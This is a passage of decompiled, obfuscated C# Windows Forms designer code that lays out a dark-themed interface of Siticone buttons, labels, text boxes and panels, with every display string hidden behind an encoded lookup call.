			this.bh = new SiticoneTextBox();
			this.bd = new SiticoneButton();
			this.aq = new SiticoneLabel();
			this.ar = new PictureBox();
			this.@as = new Label();
			this.at = new Label();
			this.aw = new Label();
			this.ax = new SiticoneLabel();
			this.ay = new SiticoneShadowPanel();
			this.bm = new SiticoneRoundedButton();
			this.bl = new SiticoneRoundedButton();
			this.bj = new SiticoneLabel();
			this.be = new SiticoneRoundedButton();
			this.bu = new SiticoneRoundedButton();
			this.bc = new SiticoneRoundedButton();
			this.az = new SiticoneLabel();
			this.ba = new PictureBox();
			this.bb = new Label();
			this.bp = new SiticoneLabel();
			this.bi = new SiticoneGradientButton();
			this.y = new SiticoneGradientButton();
			this.z = new SiticoneGradientButton();
			this.aa = new SiticoneGradientButton();
			this.l = new SiticoneShadowForm(this.e);
			this.o = new System.Windows.Forms.Timer(this.e);
			this.au = new PageSetupDialog();
			this.av = new System.Windows.Forms.Timer(this.e);
			this.bs = new System.Windows.Forms.Timer(this.e);
			this.q = new BindingSource(this.e);
			this.r.SuspendLayout();
			((ISupportInitialize)this.s).BeginInit();
			this.u.SuspendLayout();
			((ISupportInitialize)this.w).BeginInit();
			this.ai.SuspendLayout();
			((ISupportInitialize)this.ak).BeginInit();
			this.ap.SuspendLayout();
			((ISupportInitialize)this.ar).BeginInit();
			this.ay.SuspendLayout();
			((ISupportInitialize)this.ba).BeginInit();
			((ISupportInitialize)this.q).BeginInit();
			base.SuspendLayout();
			this.f.TargetControl = this;
			this.g.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
			this.g.BorderRadius = 10;
			this.i.SetDecoration(this.g, 0);
			this.g.FillColor = Color.Black;
			this.g.HoveredState.FillColor = Color.FromArgb(232, 17, 35);
			this.g.HoveredState.IconColor = Color.White;
			this.g.HoveredState.Parent = this.g;
			this.g.IconColor = Color.White;
			this.g.Location = new Point(613, 4);
			this.g.Name = global::i.a("", 61795);
			this.g.ShadowDecoration.Parent = this.g;
			this.g.Size = new Size(45, 29);
			this.g.TabIndex = 1;
			this.g.Click += this.a;
			this.h.Anchor = (AnchorStyles.Top | AnchorStyles.Right);
			this.h.BorderRadius = 10;
			this.h.ControlBoxType = 0;
			this.i.SetDecoration(this.h, 0);
			this.h.FillColor = Color.Black;
			this.h.HoveredState.Parent = this.h;
			this.h.IconColor = Color.White;
			this.h.Location = new Point(568, 4);
			this.h.Name = global::i.a("", 58852);
			this.h.ShadowDecoration.Parent = this.h;
			this.h.Size = new Size(45, 29);
			this.h.TabIndex = 2;
			this.i.AnimationType = 1;
			this.i.Cursor = null;
			animation.AnimateOnlyDifferences = true;
			animation.BlindCoeff = (PointF)componentResourceManager.GetObject(global::i.a("", 58919));
			animation.LeafCoeff = 0f;
			animation.MaxTime = 1f;
			animation.MinTime = 0f;
			animation.MosaicCoeff = (PointF)componentResourceManager.GetObject(global::i.a("", 62482));
			animation.MosaicShift = (PointF)componentResourceManager.GetObject(global::i.a("", 63445));
			animation.MosaicSize = 0;
			animation.Padding = new Padding(50);
			animation.RotateCoeff = 1f;
			animation.RotateLimit = 0f;
			animation.ScaleCoeff = (PointF)componentResourceManager.GetObject(global::i.a("", 61419));
			animation.SlideCoeff = (PointF)componentResourceManager.GetObject(global::i.a("", 60415));
			animation.TimeCoeff = 0f;
			animation.TransparencyCoeff = 1f;
			this.i.DefaultAnimation = animation;
			this.j.AutoSize = true;
			this.i.SetDecoration(this.j, 0);
			this.j.Font = new Font(global::i.a("", 63669), 10f);
			this.j.ForeColor = Color.White;
			this.j.Location = new Point(-1, 136);
			this.j.Name = global::i.a("", 60634);
			this.j.Size = new Size(0, 19);
			this.j.TabIndex = 22;
			this.k.AutoSize = true;
			this.i.SetDecoration(this.k, 0);
			this.k.Font = new Font(global::i.a("", 58767), 10.2f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.k.ForeColor = Color.White;
			this.k.Location = new Point(14, 7);
			this.k.Margin = new Padding(2, 0, 2, 0);
			this.k.Name = global::i.a("", 61420);
			this.k.Size = new Size(101, 19);
			this.k.TabIndex = 27;
			this.k.Text = global::i.a("", 59659);
			this.n.BackColor = Color.Transparent;
			this.i.SetDecoration(this.n, 0);
			this.n.Font = new Font(global::i.a("", 59604), 12f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, 161);
			this.n.ForeColor = Color.White;
			this.n.Location = new Point(51, 5);
			this.n.Margin = new Padding(2);
			this.n.Name = global::i.a("", 58035);
			this.n.Size = new Size(115, 23);
			this.n.TabIndex = 37;
			this.n.Text = global::i.a("", 58035);
			this.n.Click += this.e;
			this.m.BackColor = Color.Transparent;
			this.i.SetDecoration(this.m, 0);
			this.m.Font = new Font(global::i.a("", 59604), 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.m.ForeColor = Color.Red;
			this.m.Location = new Point(51, 30);
			this.m.Margin = new Padding(2);
			this.m.Name = global::i.a("", 62176);
			this.m.Size = new Size(95, 15);
			this.m.TabIndex = 39;
			this.m.Text = global::i.a("", 59424);
			this.m.Click += this.h;
			this.p.BackColor = Color.Transparent;
			this.i.SetDecoration(this.p, 0);
			this.p.Font = new Font(global::i.a("", 59604), 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.p.ForeColor = Color.White;
			this.p.Location = new Point(159, 295);
			this.p.Margin = new Padding(2);
			this.p.Name = global::i.a("", 57954);
			this.p.Size = new Size(63, 15);
			this.p.TabIndex = 51;
			this.p.Text = global::i.a("", 60676);
			this.p.Click += this.u;
			this.r.BackColor = Color.Black;
			this.r.Controls.Add(this.m);
			this.r.Controls.Add(this.n);
			this.r.Controls.Add(this.s);
			this.i.SetDecoration(this.r, 0);
			this.r.Location = new Point(11, 34);
			this.r.Name = global::i.a("", 62028);
			this.r.Size = new Size(175, 53);
			this.r.TabIndex = 59;
			this.r.Paint += this.t;
			this.i.SetDecoration(this.s, 0);
			this.s.Image = Resources.images_1;
			this.s.Location = new Point(3, 3);
			this.s.Name = global::i.a("", 61727);
			this.s.Size = new Size(43, 45);
			this.s.SizeMode = PictureBoxSizeMode.Zoom;
			this.s.TabIndex = 10;
			this.s.TabStop = false;
			this.s.Click += this.bq;
			this.u.BackColor = Color.Transparent;
			this.u.Controls.Add(this.bk);
			this.u.Controls.Add(this.bf);
			this.u.Controls.Add(this.ab);
			this.u.Controls.Add(this.ac);
			this.u.Controls.Add(this.ad);
			this.u.Controls.Add(this.ae);
			this.u.Controls.Add(this.af);
			this.u.Controls.Add(this.ag);
			this.u.Controls.Add(this.ah);
			this.u.Controls.Add(this.v);
			this.u.Controls.Add(this.w);
			this.u.Controls.Add(this.x);
			this.i.SetDecoration(this.u, 0);
			this.u.FillColor = Color.Black;
			this.u.Location = new Point(195, 34);
			this.u.Name = global::i.a("", 62195);
			this.u.ShadowColor = Color.Black;
			this.u.Size = new Size(455, 311);
			this.u.TabIndex = 66;
			this.u.Paint += this.r;
			this.bk.BorderColor = Color.DarkRed;
			this.bk.BorderThickness = 1;
			this.bk.CheckedState.Parent = this.bk;
			this.bk.CustomImages.Parent = this.bk;
			this.i.SetDecoration(this.bk, 0);
			this.bk.FillColor = Color.Black;
			this.bk.Font = new Font(global::i.a("", 59604), 9f);
			this.bk.ForeColor = Color.Red;
			this.bk.HoveredState.Parent = this.bk;
			this.bk.Location = new Point(54, 260);
			this.bk.Name = global::i.a("", 59256);
			this.bk.ShadowDecoration.Parent = this.bk;
			this.bk.Size = new Size(346, 29);
			this.bk.TabIndex = 72;
			this.bk.Text = global::i.a("", 60304);
			this.bk.Click += this.bn;
			this.bf.BorderColor = Color.DarkRed;
			this.bf.BorderThickness = 1;
			this.bf.CheckedState.Parent = this.bf;
			this.bf.CustomImages.Parent = this.bf;
			this.i.SetDecoration(this.bf, 0);
			this.bf.FillColor = Color.Black;
			this.bf.Font = new Font(global::i.a("", 59604), 9f);
			this.bf.ForeColor = Color.Red;
			this.bf.HoveredState.Parent = this.bf;
			this.bf.Location = new Point(277, 210);
			this.bf.Name = global::i.a("", 63294);
			this.bf.ShadowDecoration.Parent = this.bf;
			this.bf.Size = new Size(123, 29);
			this.bf.TabIndex = 71;
			this.bf.Text = global::i.a("", 61115);
			this.bf.Click += this.at;
			this.ab.BorderColor = Color.DarkRed;
			this.ab.BorderThickness = 1;
			this.ab.CheckedState.Parent = this.ab;
			this.ab.CustomImages.Parent = this.ab;
			this.i.SetDecoration(this.ab, 0);
			this.ab.FillColor = Color.Black;
			this.ab.Font = new Font(global::i.a("", 59604), 9f);
			this.ab.ForeColor = Color.Red;
			this.ab.HoveredState.Parent = this.ab;
			this.ab.Location = new Point(54, 124);
			this.ab.Name = global::i.a("", 61525);
			this.ab.ShadowDecoration.Parent = this.ab;
			this.ab.Size = new Size(123, 29);
			this.ab.TabIndex = 70;
			this.ab.Text = global::i.a("", 62485);
			this.ab.Click += this.al;
			this.ac.BorderColor = Color.DarkRed;
			this.ac.BorderThickness = 1;
			this.ac.CheckedState.Parent = this.ac;
			this.ac.CustomImages.Parent = this.ac;
			this.i.SetDecoration(this.ac, 0);
			this.ac.FillColor = Color.Black;
			this.ac.Font = new Font(global::i.a("", 59604), 9f);
			this.ac.ForeColor = Color.Red;
			this.ac.HoveredState.Parent = this.ac;
			this.ac.Location = new Point(277, 169);
			this.ac.Name = global::i.a("", 60057);
			this.ac.ShadowDecoration.Parent = this.ac;
			this.ac.Size = new Size(123, 29);
			this.ac.TabIndex = 68;
			this.ac.Text = global::i.a("", 59610);
			this.ac.Click += this.am;
			this.ad.BorderColor = Color.DarkRed;
			this.ad.BorderThickness = 1;
			this.ad.CheckedState.Parent = this.ad;
			this.ad.CustomImages.Parent = this.ad;
			this.i.SetDecoration(this.ad, 0);
			this.ad.FillColor = Color.Black;
			this.ad.Font = new Font(global::i.a("", 59604), 9f);
			this.ad.ForeColor = Color.Red;
			this.ad.HoveredState.Parent = this.ad;
			this.ad.Location = new Point(277, 124);
			this.ad.Name = global::i.a("", 61133);
			this.ad.ShadowDecoration.Parent = this.ad;
			this.ad.Size = new Size(123, 29);
			this.ad.TabIndex = 67;
			this.ad.Text = global::i.a("", 60523);
			this.ad.Click += this.ao;
			this.ae.BorderColor = Color.DarkRed;
			this.ae.BorderThickness = 1;
			this.ae.CheckedState.Parent = this.ae;
			this.ae.CustomImages.Parent = this.ae;
			this.i.SetDecoration(this.ae, 0);
			this.ae.FillColor = Color.Black;
			this.ae.Font = new Font(global::i.a("", 59604), 9f);
			this.ae.ForeColor = Color.Red;
			this.ae.HoveredState.Parent = this.ae;
			this.ae.Location = new Point(54, 169);
			this.ae.Name = global::i.a("", 60505);
			this.ae.ShadowDecoration.Parent = this.ae;
			this.ae.Size = new Size(123, 29);
			this.ae.TabIndex = 66;
			this.ae.Text = global::i.a("", 61167);
			this.ae.Click += this.ai;
			this.af.BorderColor = Color.DarkRed;
			this.af.BorderThickness = 1;
			this.af.CheckedState.Parent = this.af;
			this.af.CustomImages.Parent = this.af;
			this.i.SetDecoration(this.af, 0);
			this.af.FillColor = Color.Black;
			this.af.Font = new Font(global::i.a("", 59604), 9f);
			this.af.ForeColor = Color.Red;
			this.af.HoveredState.Parent = this.af;
			this.af.Location = new Point(54, 210);
			this.af.Name = global::i.a("", 60828);
			this.af.ShadowDecoration.Parent = this.af;
			this.af.Size = new Size(123, 29);
			this.af.TabIndex = 65;
			this.af.Text = global::i.a("", 63450);
			this.af.Click += this.ak;
			this.ag.BorderColor = Color.DarkRed;
			this.ag.BorderThickness = 1;
			this.ag.CheckedState.Parent = this.ag;
			this.ag.CustomImages.Parent = this.ag;
			this.i.SetDecoration(this.ag, 0);
			this.ag.FillColor = Color.Black;
			this.ag.Font = new Font(global::i.a("", 59604), 9f);
			this.ag.ForeColor = Color.Red;
			this.ag.HoveredState.Parent = this.ag;
			this.ag.Location = new Point(277, 82);
			this.ag.Name = global::i.a("", 60160);
			this.ag.ShadowDecoration.Parent = this.ag;
			this.ag.Size = new Size(123, 29);
			this.ag.TabIndex = 64;
			this.ag.Text = global::i.a("", 61196);
			this.ag.Click += this.aj;
			this.ah.BorderColor = Color.DarkRed;
			this.ah.BorderThickness = 1;
			this.ah.CheckedState.Parent = this.ah;
			this.ah.CustomImages.Parent = this.ah;
			this.i.SetDecoration(this.ah, 0);
			this.ah.FillColor = Color.Black;
			this.ah.Font = new Font(global::i.a("", 59604), 9f);
			this.ah.ForeColor = Color.Red;
			this.ah.HoveredState.Parent = this.ah;
			this.ah.Location = new Point(54, 82);
			this.ah.Name = global::i.a("", 61302);
			this.ah.ShadowDecoration.Parent = this.ah;
			this.ah.Size = new Size(123, 29);
			this.ah.TabIndex = 63;
			this.ah.Text = global::i.a("", 63394);
			this.ah.Click += this.ag;
			this.v.BackColor = Color.Transparent;
			this.i.SetDecoration(this.v, 0);
			this.v.Font = new Font(global::i.a("", 59604), 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.v.ForeColor = Color.Red;
			this.v.Location = new Point(68, 34);
			this.v.Margin = new Padding(2);
			this.v.Name = global::i.a("", 61420);
			this.v.Size = new Size(133, 15);
			this.v.TabIndex = 62;
			this.v.Text = global::i.a("", 61198);
			this.i.SetDecoration(this.w, 0);
			this.w.Image = Resources.pngaaa_com_3790696;
			this.w.Location = new Point(11, 10);
			this.w.Name = global::i.a("", 57436);
			this.w.Size = new Size(46, 35);
			this.w.SizeMode = PictureBoxSizeMode.Zoom;
			this.w.TabIndex = 25;
			this.w.TabStop = false;
			this.x.AutoSize = true;
			this.i.SetDecoration(this.x, 0);
			this.x.Font = new Font(global::i.a("", 60320), 18f, FontStyle.Bold);
			this.x.ForeColor = Color.White;
			this.x.Location = new Point(60, 6);
			this.x.Name = global::i.a("", 63046);
			this.x.Size = new Size(107, 32);
			this.x.TabIndex = 9;
			this.x.Text = global::i.a("", 59319);
			this.t.BackColor = Color.Transparent;
			this.i.SetDecoration(this.t, 0);
			this.t.Font = new Font(global::i.a("", 59604), 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.t.ForeColor = Color.Red;
			this.t.Location = new Point(63, 34);
			this.t.Margin = new Padding(2);
			this.t.Name = global::i.a("", 61121);
			this.t.Size = new Size(116, 15);
			this.t.TabIndex = 61;
			this.t.Text = global::i.a("", 59331);
			this.ai.BackColor = Color.Black;
			this.ai.Controls.Add(this.bq);
			this.ai.Controls.Add(this.br);
			this.ai.Controls.Add(this.an);
			this.ai.Controls.Add(this.am);
			this.ai.Controls.Add(this.aj);
			this.ai.Controls.Add(this.ak);
			this.ai.Controls.Add(this.al);
			this.ai.Controls.Add(this.ao);
			this.i.SetDecoration(this.ai, 0);
			this.ai.FillColor = Color.Black;
			this.ai.Location = new Point(195, 34);
			this.ai.Name = global::i.a("", 59351);
			this.ai.ShadowColor = Color.Black;
			this.ai.Size = new Size(455, 311);
			this.ai.TabIndex = 71;
			this.ai.Paint += this.ae;
			this.bq.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bq, 0);
			this.bq.Font = new Font(global::i.a("", 59604), 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bq.ForeColor = Color.Red;
			this.bq.Location = new Point(155, 181);
			this.bq.Margin = new Padding(2);
			this.bq.Name = global::i.a("", 60385);
			this.bq.Size = new Size(51, 15);
			this.bq.TabIndex = 74;
			this.bq.Text = global::i.a("", 58896);
			this.br.BorderColor = Color.WhiteSmoke;
			this.br.BorderRadius = 3;
			this.br.Cursor = Cursors.IBeam;
			this.i.SetDecoration(this.br, 0);
			this.br.DefaultText = global::i.a("", 61750);
			this.br.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
			this.br.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
			this.br.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
			this.br.DisabledState.Parent = this.br;
			this.br.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
			this.br.FillColor = Color.Black;
			this.br.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
			this.br.FocusedState.Parent = this.br;
			this.br.ForeColor = Color.Red;
			this.br.HoveredState.BorderColor = Color.FromArgb(94, 148, 255);
			this.br.HoveredState.Parent = this.br;
			this.br.Location = new Point(211, 178);
			this.br.Margin = new Padding(4);
			this.br.Name = global::i.a("", 58900);
			this.br.PasswordChar = '\0';
			this.br.PlaceholderText = "";
			this.br.SelectedText = "";
			this.br.ShadowDecoration.Parent = this.br;
			this.br.Size = new Size(109, 22);
			this.br.TabIndex = 73;
			this.br.TextAlign = HorizontalAlignment.Center;
			this.an.BackColor = Color.Transparent;
			this.i.SetDecoration(this.an, 0);
			this.an.Font = new Font(global::i.a("", 59604), 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.an.ForeColor = Color.White;
			this.an.Location = new Point(143, 115);
			this.an.Margin = new Padding(2);
			this.an.Name = global::i.a("", 59697);
			this.an.Size = new Size(66, 15);
			this.an.TabIndex = 69;
			this.an.Text = global::i.a("", 63605);
			this.am.BorderColor = Color.DarkRed;
			this.am.BorderThickness = 1;
			this.am.CheckedState.Parent = this.am;
			this.am.CustomImages.Parent = this.am;
			this.i.SetDecoration(this.am, 0);
			this.am.FillColor = Color.Black;
			this.am.Font = new Font(global::i.a("", 59604), 9f);
			this.am.ForeColor = Color.Red;
			this.am.HoveredState.Parent = this.am;
			this.am.Location = new Point(127, 212);
			this.am.Name = global::i.a("", 58520);
			this.am.ShadowDecoration.Parent = this.am;
			this.am.Size = new Size(209, 29);
			this.am.TabIndex = 64;
			this.am.Text = global::i.a("", 59479);
			this.am.Click += this.ab;
			this.aj.BackColor = Color.Transparent;
			this.i.SetDecoration(this.aj, 0);
			this.aj.Font = new Font(global::i.a("", 59604), 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.aj.ForeColor = Color.Red;
			this.aj.Location = new Point(65, 34);
			this.aj.Margin = new Padding(2);
			this.aj.Name = global::i.a("", 58931);
			this.aj.Size = new Size(76, 15);
			this.aj.TabIndex = 62;
			this.aj.Text = global::i.a("", 62955);
			this.i.SetDecoration(this.ak, 0);
			this.ak.Image = Resources.game;
			this.ak.Location = new Point(11, 10);
			this.ak.Name = global::i.a("", 57924);
			this.ak.Size = new Size(46, 35);
			this.ak.SizeMode = PictureBoxSizeMode.Zoom;
			this.ak.TabIndex = 25;
			this.ak.TabStop = false;
			this.al.AutoSize = true;
			this.i.SetDecoration(this.al, 0);
			this.al.Font = new Font(global::i.a("", 60320), 18f, FontStyle.Bold);
			this.al.ForeColor = Color.White;
			this.al.Location = new Point(60, 6);
			this.al.Name = global::i.a("", 62165);
			this.al.Size = new Size(93, 32);
			this.al.TabIndex = 9;
			this.al.Text = global::i.a("", 60820);
			this.ao.AccessibleDescription = global::i.a("", 58129);
			this.ao.AccessibleName = "";
			this.ao.BackColor = Color.Black;
			this.ao.BorderColor = Color.Black;
			this.i.SetDecoration(this.ao, 0);
			this.ao.DrawMode = DrawMode.OwnerDrawFixed;
			this.ao.DropDownStyle = ComboBoxStyle.DropDownList;
			this.ao.FillColor = Color.Black;
			this.ao.FocusedColor = Color.Black;
			this.ao.Font = new Font(global::i.a("", 59604), 10f);
			this.ao.ForeColor = Color.Red;
			this.ao.FormattingEnabled = true;
			this.ao.HoveredState.BorderColor = Color.FromArgb(26, 32, 54);
			this.ao.HoveredState.FillColor = Color.FromArgb(26, 32, 54);
			this.ao.HoveredState.Parent = this.ao;
			this.ao.ItemHeight = 30;
			this.ao.Items.AddRange(new object[]
			{
				global::i.a("", 62772),
				global::i.a("", 58741),
				global::i.a("", 63295),
				global::i.a("", 61807)
			});
			this.ao.ItemsAppearance.Parent = this.ao;
			this.ao.Location = new Point(136, 130);
			this.ao.Name = global::i.a("", 58863);
			this.ao.ShadowDecoration.Parent = this.ao;
			this.ao.Size = new Size(184, 36);
			this.ao.TabIndex = 68;
			this.ao.Tag = "";
			this.ao.SelectedIndexChanged += this.af;
			this.ap.BackColor = Color.Transparent;
			this.ap.Controls.Add(this.bo);
			this.ap.Controls.Add(this.bn);
			this.ap.Controls.Add(this.bg);
			this.ap.Controls.Add(this.bh);
			this.ap.Controls.Add(this.bd);
			this.ap.Controls.Add(this.aq);
			this.ap.Controls.Add(this.ar);
			this.ap.Controls.Add(this.@as);
			this.ap.Controls.Add(this.p);
			this.i.SetDecoration(this.ap, 0);
			this.ap.FillColor = Color.Black;
			this.ap.ForeColor = Color.Crimson;
			this.ap.Location = new Point(195, 34);
			this.ap.Name = global::i.a("", 57479);
			this.ap.ShadowColor = Color.Black;
			this.ap.Size = new Size(455, 311);
			this.ap.TabIndex = 72;
			this.ap.Paint += this.aq;
			this.bo.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bo, 0);
			this.bo.Font = new Font(global::i.a("", 59604), 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bo.ForeColor = Color.White;
			this.bo.Location = new Point(233, 295);
			this.bo.Margin = new Padding(2);
			this.bo.Name = global::i.a("", 57831);
			this.bo.Size = new Size(78, 15);
			this.bo.TabIndex = 76;
			this.bo.Text = global::i.a("", 63137);
			this.bo.Click += this.bs;
			this.bn.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bn, 0);
			this.bn.Font = new Font(global::i.a("", 59604), 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bn.ForeColor = Color.Red;
			this.bn.Location = new Point(223, 295);
			this.bn.Margin = new Padding(2);
			this.bn.Name = global::i.a("", 58646);
			this.bn.Size = new Size(7, 15);
			this.bn.TabIndex = 75;
			this.bn.Text = global::i.a("", 58428);
			this.bg.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bg, 0);
			this.bg.Font = new Font(global::i.a("", 59604), 9f, FontStyle.Bold, GraphicsUnit.Point, 161);
			this.bg.ForeColor = Color.Red;
			this.bg.Location = new Point(37, 131);
			this.bg.Margin = new Padding(2);
			this.bg.Name = global::i.a("", 63408);
			this.bg.Size = new Size(66, 17);
			this.bg.TabIndex = 73;
			this.bg.Text = global::i.a("", 62436);
			this.bh.BorderColor = Color.WhiteSmoke;
			this.bh.BorderRadius = 3;
			this.bh.Cursor = Cursors.IBeam;
			this.i.SetDecoration(this.bh, 0);
			this.bh.DefaultText = global::i.a("", 62006);
			this.bh.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
			this.bh.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
			this.bh.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
			this.bh.DisabledState.Parent = this.bh;
			this.bh.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
			this.bh.FillColor = Color.Black;
			this.bh.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
			this.bh.FocusedState.Parent = this.bh;
			this.bh.ForeColor = Color.Red;
			this.bh.HoveredState.BorderColor = Color.FromArgb(94, 148, 255);
			this.bh.HoveredState.Parent = this.bh;
			this.bh.Location = new Point(107, 126);
			this.bh.Margin = new Padding(4);
			this.bh.Name = global::i.a("", 60332);
			this.bh.PasswordChar = '\0';
			this.bh.PlaceholderText = "";
			this.bh.SelectedText = "";
			this.bh.ShadowDecoration.Parent = this.bh;
			this.bh.Size = new Size(26, 28);
			this.bh.TabIndex = 72;
			this.bh.TextAlign = HorizontalAlignment.Center;
			this.bd.BorderColor = Color.Red;
			this.bd.BorderRadius = 4;
			this.bd.BorderThickness = 2;
			this.bd.CheckedState.Parent = this.bd;
			this.bd.CustomImages.Parent = this.bd;
			this.i.SetDecoration(this.bd, 0);
			this.bd.FillColor = Color.Black;
			this.bd.Font = new Font(global::i.a("", 60320), 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bd.ForeColor = Color.White;
			this.bd.HoveredState.Parent = this.bd;
			this.bd.Location = new Point(30, 77);
			this.bd.Name = global::i.a("", 57928);
			this.bd.PressedColor = Color.FromArgb(26, 32, 54);
			this.bd.ShadowDecoration.Parent = this.bd;
			this.bd.Size = new Size(117, 32);
			this.bd.TabIndex = 71;
			this.bd.Text = global::i.a("", 63017);
			this.bd.Click += this.bc;
			this.aq.BackColor = Color.Transparent;
			this.i.SetDecoration(this.aq, 0);
			this.aq.Font = new Font(global::i.a("", 59604), 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.aq.ForeColor = Color.Red;
			this.aq.Location = new Point(65, 34);
			this.aq.Margin = new Padding(2);
			this.aq.Name = global::i.a("", 57665);
			this.aq.Size = new Size(101, 15);
			this.aq.TabIndex = 62;
			this.aq.Text = global::i.a("", 61640);
			this.i.SetDecoration(this.ar, 0);
			this.ar.Image = Resources.kindpng_3933927;
			this.ar.Location = new Point(11, 10);
			this.ar.Name = global::i.a("", 57356);
			this.ar.Size = new Size(46, 35);
			this.ar.SizeMode = PictureBoxSizeMode.Zoom;
			this.ar.TabIndex = 25;
			this.ar.TabStop = false;
			this.@as.AutoSize = true;
			this.i.SetDecoration(this.@as, 0);
			this.@as.Font = new Font(global::i.a("", 60320), 18f, FontStyle.Bold);
			this.@as.ForeColor = Color.White;
			this.@as.Location = new Point(60, 3);
			this.@as.Name = global::i.a("", 59305);
			this.@as.Size = new Size(111, 32);
			this.@as.TabIndex = 9;
			this.@as.Text = global::i.a("", 59083);
			this.at.AutoSize = true;
			this.i.SetDecoration(this.at, 0);
			this.at.Font = new Font(global::i.a("", 58767), 10.2f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.at.ForeColor = Color.Red;
			this.at.Location = new Point(116, 7);
			this.at.Margin = new Padding(2, 0, 2, 0);
			this.at.Name = global::i.a("", 63140);
			this.at.Size = new Size(13, 19);
			this.at.TabIndex = 74;
			this.at.Text = global::i.a("", 58428);
			this.aw.AutoSize = true;
			this.i.SetDecoration(this.aw, 0);
			this.aw.Font = new Font(global::i.a("", 58767), 10.2f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.aw.ForeColor = Color.White;
			this.aw.Location = new Point(130, 8);
			this.aw.Margin = new Padding(2, 0, 2, 0);
			this.aw.Name = global::i.a("", 57994);
			this.aw.Size = new Size(71, 19);
			this.aw.TabIndex = 75;
			this.aw.Text = global::i.a("", 57926);
			this.ax.BackColor = Color.Transparent;
			this.i.SetDecoration(this.ax, 0);
			this.ax.Font = new Font(global::i.a("", 58767), 9f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, 161);
			this.ax.ForeColor = Color.Red;
			this.ax.Location = new Point(67, 324);
			this.ax.Margin = new Padding(2);
			this.ax.Name = global::i.a("", 61990);
			this.ax.Size = new Size(62, 17);
			this.ax.TabIndex = 40;
			this.ax.Text = global::i.a("", 62966);
			this.ax.Click += this.ar;
			this.ay.BackColor = Color.Transparent;
			this.ay.Controls.Add(this.bm);
			this.ay.Controls.Add(this.bl);
			this.ay.Controls.Add(this.bj);
			this.ay.Controls.Add(this.be);
			this.ay.Controls.Add(this.bu);
			this.ay.Controls.Add(this.bc);
			this.ay.Controls.Add(this.az);
			this.ay.Controls.Add(this.ba);
			this.ay.Controls.Add(this.bb);
			this.i.SetDecoration(this.ay, 0);
			this.ay.FillColor = Color.Black;
			this.ay.Location = new Point(195, 34);
			this.ay.Name = global::i.a("", 59899);
			this.ay.ShadowColor = Color.Black;
			this.ay.Size = new Size(455, 311);
			this.ay.TabIndex = 73;
			this.ay.Paint += this.aw;
			this.bm.BorderColor = Color.DarkRed;
			this.bm.BorderThickness = 1;
			this.bm.CheckedState.Parent = this.bm;
			this.bm.CustomImages.Parent = this.bm;
			this.i.SetDecoration(this.bm, 0);
			this.bm.FillColor = Color.Black;
			this.bm.Font = new Font(global::i.a("", 59604), 9f);
			this.bm.ForeColor = Color.Red;
			this.bm.HoveredState.Parent = this.bm;
			this.bm.Location = new Point(303, 223);
			this.bm.Name = global::i.a("", 58914);
			this.bm.ShadowDecoration.Parent = this.bm;
			this.bm.Size = new Size(123, 29);
			this.bm.TabIndex = 75;
			this.bm.Text = global::i.a("", 63234);
			this.bm.Click += this.bp;
			this.bl.BorderColor = Color.DarkRed;
			this.bl.BorderThickness = 1;
			this.bl.CheckedState.Parent = this.bl;
			this.bl.CustomImages.Parent = this.bl;
			this.i.SetDecoration(this.bl, 0);
			this.bl.FillColor = Color.Black;
			this.bl.Font = new Font(global::i.a("", 59604), 9f);
			this.bl.ForeColor = Color.Red;
			this.bl.HoveredState.Parent = this.bl;
			this.bl.Location = new Point(30, 225);
			this.bl.Name = global::i.a("", 61250);
			this.bl.ShadowDecoration.Parent = this.bl;
			this.bl.Size = new Size(123, 29);
			this.bl.TabIndex = 74;
			this.bl.Text = global::i.a("", 59761);
			this.bl.Click += this.bo;
			this.bj.BackColor = Color.Transparent;
			this.i.SetDecoration(this.bj, 0);
			this.bj.Font = new Font(global::i.a("", 59604), 7.8f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bj.ForeColor = Color.Red;
			this.bj.Location = new Point(107, 159);
			this.bj.Margin = new Padding(2);
			this.bj.Name = global::i.a("", 60030);
			this.bj.Size = new Size(229, 15);
			this.bj.TabIndex = 73;
			this.bj.Text = global::i.a("", 63299);
			this.be.BorderColor = Color.DarkRed;
			this.be.BorderThickness = 1;
			this.be.CheckedState.Parent = this.be;
			this.be.CustomImages.Parent = this.be;
			this.i.SetDecoration(this.be, 0);
			this.be.FillColor = Color.Black;
			this.be.Font = new Font(global::i.a("", 59604), 9f);
			this.be.ForeColor = Color.Red;
			this.be.HoveredState.Parent = this.be;
			this.be.Location = new Point(25, 271);
			this.be.Name = global::i.a("", 62719);
			this.be.ShadowDecoration.Parent = this.be;
			this.be.Size = new Size(402, 29);
			this.be.TabIndex = 72;
			this.be.Text = global::i.a("", 60364);
			this.be.Click += this.bk;
			this.bu.BorderColor = Color.DarkRed;
			this.bu.BorderThickness = 1;
